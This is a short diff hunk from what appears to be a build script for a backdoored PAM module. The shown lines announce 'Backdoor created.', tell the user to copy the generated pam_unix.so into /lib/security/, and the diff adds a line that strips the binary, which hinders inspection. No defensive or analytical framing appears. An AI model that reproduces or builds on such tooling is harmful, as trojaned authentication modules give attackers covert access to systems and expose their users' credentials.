@@ -69,4 +69,4 @@ cd ..
 echo "Backdoor created."
 echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
 echo ""
-
+strip pam_unix.so
